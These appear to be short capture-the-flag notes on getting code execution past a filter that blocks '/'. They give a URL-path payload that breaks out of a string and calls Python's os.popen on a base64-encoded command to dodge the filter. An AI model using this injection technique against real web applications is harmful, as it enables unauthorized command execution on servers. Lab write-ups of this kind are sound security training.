- The objective of this exercise is to find a way to get execute code

- this challenge like the the previous challenge but the difference is i can't use / in commands so can yse program like `/usr/local/bin/score e39cdb59-92a6-4d2d-bff4-2ca2b65b40dc` 

- so the solution is encode the command and decode it in the run time

- payload `/hello/hacker"%2bstr(__import__('os').popen( __import__('base64').b64decode('bHMgLWxh') ).read())%2b"`
